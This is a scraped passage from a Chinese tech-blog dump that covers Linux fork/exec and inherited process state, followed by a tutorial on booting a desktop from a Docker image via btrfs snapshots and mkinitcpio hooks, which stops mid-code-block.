</span><span class=\"crayon-o\">==</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5a634bcc1f199463133081-5\"><span class=\"crayon-h\">    </span><span class=\"crayon-c\">// 我现在是子进程</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634bcc1f199463133081-6\"><span class=\"crayon-h\">    </span><span class=\"crayon-c\">// “ls” 吃掉了我脑子，然后变成一个完全不一样的进程</span></div><div class=\"crayon-line\" id=\"crayon-5a634bcc1f199463133081-7\"><span class=\"crayon-h\">    </span><span class=\"crayon-e\">exec</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">[</span><span class=\"crayon-s\">\"ls\"</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634bcc1f199463133081-8\"><span class=\"crayon-sy\">}</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">else</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">if</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">pid</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">==</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5a634bcc1f199463133081-9\"><span class=\"crayon-h\">    </span><span class=\"crayon-c\">// 天啊，fork 失败了，简直是灾难！</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634bcc1f199463133081-10\"><span class=\"crayon-sy\">}</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">else</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5a634bcc1f199463133081-11\"><span class=\"crayon-h\">    </span><span class=\"crayon-c\">// 我是父进程耶</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634bcc1f199463133081-12\"><span class=\"crayon-h\">    </span><span class=\"crayon-c\">// 继续做一个酷酷的美男子吧</span></div><div class=\"crayon-line\" id=\"crayon-5a634bcc1f199463133081-13\"><span class=\"crayon-h\">    </span><span class=\"crayon-c\">// 需要的话，我可以等待子进程结束</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634bcc1f199463133081-14\"><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5a634bcc1f199463133081-15\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0016 seconds] -->\r\n<p></p>\n<h3 id=\"toc_3\">上文提到的“脑子被吃掉”是什么意思呢？</h3>\n<p>进程有很多属性：</p>\n<ul>\n<li>打开的文件（包括打开的网络连接）</li>\n<li>环境变量</li>\n<li>信号处理程序（在程序上运行 Ctrl + C 时会发生什么？）</li>\n<li>内存（你的“地址空间”）</li>\n<li>寄存器</li>\n<li>可执行文件（<code>/proc/$pid/exe</code>）</li>\n<li>cgroups 和命名空间（与 Linux 容器相关）</li>\n<li>当前的工作目录</li>\n<li>运行程序的用户</li>\n<li>其他我还没想到的</li>\n</ul>\n<p>当你运行 <code>execve</code> 并让另一个程序吃掉你的脑子的时候，实际上几乎所有东西都是相同的！ 你们有相同的环境变量、信号处理程序和打开的文件等等。</p>\n<p>唯一改变的是，内存、寄存器以及正在运行的程序，这可是件大事。</p>\n<h3 id=\"toc_4\">为何 fork 并非那么耗费资源（写入时复制）</h3>\n<p>你可能会问：“如果我有一个使用了 2GB 内存的进程，这是否意味着每次我启动一个子进程，所有 2 GB 的内存都要被复制一次？这听起来要耗费很多资源！”</p>\n<p>事实上，Linux 为 <code>fork()</code> 调用实现了写时复制copy on write，对于新进程的 2GB 内存来说，就像是“看看旧的进程就好了，是一样的！”。然后，当如果任一进程试图写入内存，此时系统才真正地复制一个内存的副本给该进程。如果两个进程的内存是相同的，就不需要复制了。</p>\n<h3 id=\"toc_5\">为什么你需要知道这么多</h3>\n<p>你可能会说，好吧，这些细节听起来很厉害，但为什么这么重要？关于信号处理程序或环境变量的细节会被继承吗？这对我的日常编程有什么实际影响呢？</p>\n<p>有可能哦！比如说，在 Kamal 的博客上有一个很有意思的 <a href=\"http://kamalmarhubi.com/blog/2015/06/30/my-favourite-bug-so-far-at-the-recurse-center/\">bug</a>。它讨论了 Python 如何使信号处理程序忽略了 <code>SIGPIPE</code>。也就是说，如果你从 Python 里运行一个程序，默认情况下它会忽略 <code>SIGPIPE</code>！这意味着，程序从 Python 脚本和从 shell 启动的表现会<strong>有所不同</strong>。在这种情况下，它会造成一个奇怪的问题。</p>\n<p>所以，你的程序的环境（环境变量、信号处理程序等）可能很重要，都是从父进程继承来的。知道这些，在调试时是很有用的。</p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"113506\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"113506votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"113506\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i>  收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i>  评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "front_img_path": "full/a0c1bbf258eb5064ea3d6b896485a481525b7f95.jpg"}
{"url_object_id": "7b88426617fb1d20ba1260658b57c9c2", "title": "把docker镜像当作桌面系统来用", "url": "http://blog.jobbole.com/113448/", "create_date": "2018/01/08", "front_img_url": ["http://jbcdn2.b0.upaiyun.com/2014/01/382b1251c2cdb32cf334445596f97085.png"], "praise_nums": 1, "comment_nums": 0, "favor_nums": 2, "tags": "IT技术,Docker", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a target=\"_blank\" href=\"https://zasdfgbnm.github.io/2017/12/28/%E6%8A%8Adocker%E9%95%9C%E5%83%8F%E5%BD%93%E4%BD%9C%E6%A1%8C%E9%9D%A2%E7%B3%BB%E7%BB%9F%E6%9D%A5%E7%94%A8/\">zasdfgbnm</a>   </div><div>\n<p>博主一直都很喜欢思考怎样管理装在自己电脑上的桌面系统，这篇算是前作<a href=\"http://blog.jobbole.com/111672/\">能当主力，能入虚拟机，还能随时打包带走，Linux就是这么强大</a>的后续探索吧。</p>\n<p>近些年来，Docker由于提供了一套非常方便地创建并运行应用容器的方法，而在全球掀起了一股容器化的热潮。容器通过将软件及其所需要的运行环境一同打包带走，从而将人们从依赖的苦海中拯救出来。虽然Docker设计的初衷并不是操作系统容器，更不是一个直接运行在裸机上的操作系统，但是docker这套强大的工具也会给我们管理操作系统带来巨大的便利。</p>\n<p>为什么要用Docker镜像当作桌面系统？这就要从普通桌面系统的不方便之处说起。通常我们都拥有不止一台电脑，我们希望这些电脑能够保持一致。这里所说的“一致”，用一个例子来讲，就是我在一台电脑上编辑了一半的文件，不需要认为拷贝到另一台电脑上，而是直接打开电脑就能编辑。如果这个文件只是一个纯文本文件，或者一个Microsoft Word文档，那么实现这个一致性非常简单：把文件扔到Dropbox之类的云同步盘就好。然而对于专业用户来讲，这种一致性的保持并非单纯的扔到Dropbox里面那么简单：比如说你最近忙于一个项目，这个项目要用到若干编程语言，然后在电脑里装了一堆库，一堆工具软件，有图形界面的，也有命令行的。在工作的过程中，你有可能不断安装新的工具，或者决定弃用某个之前计划使用的库或者工具。要让你的工作在你的若干台电脑上都能工作，就要一直维护不同机器的环境的一致性：在一台机器上安装的工具，要在所有机器上重新安装一遍。在一台机器上升级了的库，要在所有机器上都升级，稍微有所差池，就有可能出现某个脚本/程序在一台机器上跑的好好的，在另一台机器上却无法运行的问题。</p>\n<h1 id=\"docker哲学\">docker哲学</h1>\n<p>不熟悉docker的读者可以戳<a href=\"https://docs.docker.com/get-started/\" target=\"_blank\" rel=\"noopener\">这里</a>来了解docker。Docker的使用非常简单：我们通过写一个Dockerfile，在Dockerfile中写入相应的命令来安装以及配置我们想要的库跟工具。不熟悉docker的读者可以看一下下面这个<a href=\"https://github.com/kstaken/dockerfile-examples/blob/master/nodejs/Dockerfile\" target=\"_blank\" rel=\"noopener\">抄来的Dockerfile的例子</a>，来了解一下Dockerfile长啥样子：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a634c1be0f0b520573697\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nFROM ubuntu\r\nMAINTAINER Kimbro Staken\r\nRUN apt-get install -y software-properties-common python\r\nRUN add-apt-repository ppa:chris-lea/node.js\r\nRUN echo \"deb http://us.archive.ubuntu.com/ubuntu/ precise universe\" &gt;&gt; /etc/apt/sources.list\r\nRUN apt-get update\r\nRUN apt-get install -y nodejs\r\n#RUN apt-get install -y nodejs=0.6.12~dfsg1-1ubuntu1\r\nRUN mkdir /var/www\r\nADD app.js /var/www/app.js\r\nCMD [\"/usr/bin/node\", \"/var/www/app.js\"]</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a634c1be0f0b520573697-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634c1be0f0b520573697-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a634c1be0f0b520573697-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634c1be0f0b520573697-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5a634c1be0f0b520573697-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634c1be0f0b520573697-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5a634c1be0f0b520573697-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634c1be0f0b520573697-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5a634c1be0f0b520573697-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634c1be0f0b520573697-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5a634c1be0f0b520573697-11\">11</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a634c1be0f0b520573697-1\"><span class=\"crayon-e\">FROM </span><span class=\"crayon-e\">ubuntu</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634c1be0f0b520573697-2\"><span class=\"crayon-e\">MAINTAINER </span><span class=\"crayon-e\">Kimbro </span><span class=\"crayon-e\">Staken</span></div><div class=\"crayon-line\" id=\"crayon-5a634c1be0f0b520573697-3\"><span class=\"crayon-e\">RUN </span><span class=\"crayon-v\">apt</span><span class=\"crayon-o\">-</span><span class=\"crayon-e\">get </span><span class=\"crayon-v\">install</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">y</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">software</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">properties</span><span class=\"crayon-o\">-</span><span class=\"crayon-e\">common </span><span class=\"crayon-e\">python</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634c1be0f0b520573697-4\"><span class=\"crayon-e\">RUN </span><span class=\"crayon-v\">add</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">apt</span><span class=\"crayon-o\">-</span><span class=\"crayon-e\">repository </span><span class=\"crayon-v\">ppa</span><span class=\"crayon-o\">:</span><span class=\"crayon-v\">chris</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">lea</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">node</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">js</span></div><div class=\"crayon-line\" id=\"crayon-5a634c1be0f0b520573697-5\"><span class=\"crayon-e\">RUN </span><span class=\"crayon-i\">echo</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"deb http://us.archive.ubuntu.com/ubuntu/ precise universe\"</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&gt;&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">etc</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">apt</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">sources</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">list</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634c1be0f0b520573697-6\"><span class=\"crayon-e\">RUN </span><span class=\"crayon-v\">apt</span><span class=\"crayon-o\">-</span><span class=\"crayon-e\">get </span><span class=\"crayon-e\">update</span></div><div class=\"crayon-line\" id=\"crayon-5a634c1be0f0b520573697-7\"><span class=\"crayon-e\">RUN </span><span class=\"crayon-v\">apt</span><span class=\"crayon-o\">-</span><span class=\"crayon-e\">get </span><span class=\"crayon-v\">install</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">y</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">nodejs</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634c1be0f0b520573697-8\"><span class=\"crayon-p\">#RUN apt-get install -y nodejs=0.6.12~dfsg1-1ubuntu1</span></div><div class=\"crayon-line\" id=\"crayon-5a634c1be0f0b520573697-9\"><span class=\"crayon-e\">RUN </span><span class=\"crayon-v\">mkdir</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-t\">var</span><span class=\"crayon-o\">/</span><span class=\"crayon-e\">www</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634c1be0f0b520573697-10\"><span class=\"crayon-e\">ADD </span><span class=\"crayon-v\">app</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">js</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-t\">var</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">www</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">app</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">js</span></div><div class=\"crayon-line\" id=\"crayon-5a634c1be0f0b520573697-11\"><span class=\"crayon-i\">CMD</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-s\">\"/usr/bin/node\"</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"/var/www/app.js\"</span><span class=\"crayon-sy\">]</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0038 seconds] -->\r\n<p>有了Dockerfile，只需要<code>docker build</code>一条命令就可以创建一个docker镜像。同时Docker公司提供一个叫做DockerHub的服务，可以免费托管公开镜像。只需要使用<code>docker push</code>就可以直接把镜像上传到DockerHub。在不同的电脑上只需要<code>docker pull</code>就可以从DockerHub获取最新版的镜像。DockerHub还支持自动构建，通过把DockerHub帐号跟GitHub帐号关联起来，就可以让DockerHub在GitHub上面的Dockerfile出现更改的时候自动重新生成镜像。</p>\n<p>本文开头所说的这种一致性的维护，docker实际上已经在给我们提供答案了：我们通过构建一个docker镜像，让这个镜像包含着我们项目所需要的所有的一切。这样的话，我们开发，测试，部署等等一切任务，都可以在先用<code>docker run</code>来开启一个容器，然后在容里面进行所有的工作。当我们决定修改运行环境，比如引入新的库的时候，就在Dockerfile中进行相应的修改，重新生成镜像，然后在不同的机器上用<code>docker pull</code>来更新一下就好。这种使用哲学，通过一个中心化了的仓库，非常优雅地解决了不同机器上环境一致的问题。美中不足的是，并不是所有的程序都能在容器里运行的，也并不是所有的程序都方便在容器里运行的。如果你用到了图形界面的程序，或者说是一些系统级别的程序，那么在容器里面使用这些程序会麻烦很多，有的甚至根本无法实现。于是自然地就会想到，如果我们能够在每次开机的时候，直接把某个docker生成的镜像挂载起来当根目录来使用，就可以让这个镜像直接在裸机上（而不是在容器中）运行，来做我们的日常桌面系统了。</p>\n<p>这种做法，除了在保持一致性方面带来的便利以外，还有一些其他的好处：</p>\n<ul>\n<li>整个系统保存在云端，本地的内容仅仅是云端的一份缓存而已，这样就完全没有必要定期对系统进行备份了。</li>\n<li>你的系统是如何从零开始一步一步配置成你想要的样子的，所有的一切都清晰地展现在Dockerfile里面。Dockerfile就是你最好的笔记。</li>\n<li>完全不用担心系统长时间使用产生一些残余的垃圾文件、或者某些系统中某些程序的数据出现损坏，因为每次开机，我们用的都是一个全新的系统。</li>\n<li>要装一台新机器，并不需要从头安装操作系统，只要从DockerHub拉取镜像拿来用就好，安装系统这个过程变得极其方便。</li>\n<li>系统更新的过程实际上就是根据Dockerfile从最新的软件仓库重新从头安装生成docker镜像的过程，不会出现某些更新遇到文件冲突或者依赖无法处理，需要人为干预才能完成的问题。</li>\n</ul>\n<h1 id=\"docker存储驱动的工作原理\">docker存储驱动的工作原理</h1>\n<p>Docker的存储驱动<a href=\"https://docs.docker.com/engine/userguide/storagedriver/imagesandcontainers/\" target=\"_blank\" rel=\"noopener\">官方有介绍其工作原理</a>，这里只是简单概括一下。Docker使用了层的概念，docker在构建镜像的时候，会逐行执行我们的Dockerfile中的每一行，每执行一行的时候，docker就会创建出一个新的层来存放新的内容。当我们执行<code>docker pull</code>或者<code>docker push</code>的时候，docker实际上传跟下载的是这些层之间的增量。每当执行<code>docker run</code>，docker就会把这些下载下来的层组合到一起，组合成一个完整的镜像，然后新建一个读写层，所有运行过程中的写入都会被写入到读写层中，而镜像本身则是保持只读，不会被更改。“层”这个概念具体实现起来，根据docker目录（通常为<code>/var/lib/docker</code>这个目录）所在的文件系统的不同而不同，具体的实现在docker中被称为graph driver，docker自带的graph driver包括aufs、 overlay、btrfs、zfs、devicemapper等。这些graph driver大多使用了写时复制的技术，这样在把各个层组合在一起的过程不需要重新拷贝一份数据，实际的拷贝是在写入的时候发生的。</p>\n<p>由于笔者使用的是btrfs，所以本文就以btrfs为例子来介绍怎么让系统启动到docker镜像上去。btrfs是一个写时复制的系统，由于docker的镜像是由一个一个的层叠在一起组成的，docker在使用btrfs的时候，每往上叠一层，docker就会创建一个原来层的快照，然后把新层的内容写到快照里面去。然后docker会在从镜像创建容器的时候，给镜像的最顶层做个快照，把这个快照当作容器读写层来用。</p>\n<h1 id=\"启动到docker镜像中去\">启动到docker镜像中去</h1>\n<p>明白了docker存储驱动的工作原理，还需要知道Linux的启动过程才能达成我们的目标。Linux在启动的时候，一般会让启动器给内核装载一个内存盘initramfs，然后内核完成简单的早期初始化以后，就会解压内存盘的内容到根目录<code>/</code>，然后启动内存盘中的init程序（一般为<code>/init</code>），这个init程序会进行进一步的初始化（比如说加载文件系统的驱动，对文件系统进行fsck等），这一步初始化完成了以后，这个init程序就会根据内核选项中的<code>root</code>、<code>rootflags</code>等内容挂载真正的根目录，然后通过<code>switch_root</code>程序启动真正根目录中的init程序，这个init程序则会完成最后的初始化工作，比如挂载fstab、加载图形界面等等。很多发行版都提供制作initramfs的工具，比如archlinux的mkinitcpio，这些工具通常都是模块化的，允许用户自己添加hook。</p>\n<p>让系统启动到docker镜像所需要的知识已经完备了。思路也清晰了：通过给initramfs中添加hook，让initramfs中的init在挂载root之前从docker本地缓存中的镜像中创建出一个快照作为读写层，然后把这个读写层当作真正的root来挂载。具体操作上，在启动管理器里面写启动项的内核选项的时候，<code>root</code>就写<code>/var/lib/docker</code>所在的分区，而<code>rootflags</code>里面至少要有一项<code>subvol=XXXXX</code>，其中XXXXX是我们打算创建的读写层的位置。然后重中之重则是，写一个hook，这个hook干的事情是：找到想要的docker镜像对应的btrfs子卷，给这个子卷创建一个快照，命名为XXXXX（跟内核选项中的名字保持一致）。这样的话，在Linux把控制权交给initramfs中的init程序以后，init程序会先去从docker缓存中的子卷创造出XXXXX快照，然后把XXXXX快照当作root来挂载以及进行接下来的操作。如果读者跟笔者一样使用Arch Linux的话，那么所有的这些工作笔者已经做了，读者可以直接拿来用。</p>\n<p>笔者的源码位于GitHub： <a href=\"https://github.com/zasdfgbnm/mkinitcpio-docker-hooks\" target=\"_blank\" rel=\"noopener\">https://github.com/zasdfgbnm/mkinitcpio-docker-hooks</a> ，同时读者也可以直接从AUR中搜索<code>mkinitcpio-docker-hooks</code>来安装笔者的hook。下面就来介绍一下这个hook的使用方法。</p>\n<h1 id=\"mkinitcpio-docker-hooks的使用\">mkinitcpio-docker-hooks的使用</h1>\n<p>mkinitcpio-docker-hooks的使用流程大概分为如下几步：</p>\n<ol>\n<li>确保你的<code>/var/lib/docker</code>位于某个btrfs分区中</li>\n<li>准备一个适合在裸机上启动的docker镜像</li>\n<li>然后在这个镜像中安装并配置mkinitcpio-docker-hooks</li>\n<li>准备内核跟initramfs</li>\n<li>准备top layer的内容</li>\n<li>设置启动管理器</li>\n</ol>\n<h2 id=\"docker镜像的准备\">docker镜像的准备</h2>\n<p>要想启动到docker镜像中去，首先你得有一个适合在裸机上启动的docker镜像。很多docker镜像，为了减小镜像的大小，是不会附带只有裸机上才能用到的软件包（比如<code>dhcpcd</code>）的，所以读者可能需要在Dockerfile中手动安装这些软件包，对于Arch Linux来讲，只需要安装base组就可以了。由于接下来要安装<code>mkinitcpio-docker-hooks</code>，这里推荐使用一个已经内置yaourt的镜像，笔者使用的是自己的archlinux-yaourt镜像<a href=\"https://cloud.docker.com/swarm/zasdfgbnm/repository/docker/zasdfgbnm/archlinux-yaourt/general\" target=\"_blank\" rel=\"noopener\">zasdfgbnm/archlinux-yaourt</a>。所以，Dockerfile的开头看起来是这个样子的：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a634c1be0f1c792114683\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nFROM zasdfgbnm/archlinux-yaourt\r\nUSER root\r\nRUN pacman -Syu --noconfirm base</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a634c1be0f1c792114683-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634c1be0f1c792114683-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a634c1be0f1c792114683-3\">3</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a634c1be0f1c792114683-1\"><span class=\"crayon-e\">FROM </span><span class=\"crayon-v\">zasdfgbnm</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">archlinux</span><span class=\"crayon-o\">-</span><span class=\"crayon-e\">yaourt</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634c1be0f1c792114683-2\"><span class=\"crayon-e\">USER </span><span class=\"crayon-e\">root</span></div><div class=\"crayon-line\" id=\"crayon-5a634c1be0f1c792114683-3\"><span class=\"crayon-e\">RUN </span><span class=\"crayon-v\">pacman</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">Syu</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">--</span><span class=\"crayon-e\">noconfirm </span><span class=\"crayon-v\">base</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0007 seconds] -->\r\n<p>作为示例，这里就不安装base之外的其他软件了，读者请自己根据需要安装其他软件。</p>\n<h2 id=\"安装并配置mkinitcpio-docker-hooks\">安装并配置mkinitcpio-docker-hooks</h2>\n<p><code>mkinitcpio-docker-hooks</code>的安装是在docker里面而不是当前运行在裸机上的系统中进行的。之所以要把这个软件包安装在docker镜像里面，很重要的原因是因为Linux内核不提供ABI的稳定性，所以内核模块跟内核的版本必须严格对应，不然模块是无法加载的。为了保持这种一致性，我们采取的措施是，在docker里面安装<code>mkinitcpio-docker-hooks</code>，在docker中生成initramfs，并且在启动的时候用镜像里面的内核启动，就可以确保内核、initramfs中的模块、启动到镜像以后的<code>/lib/modules</code>三者保持一致。安装过程在Dockerfile中的写法如下：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a634c1be0f21613753754\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" 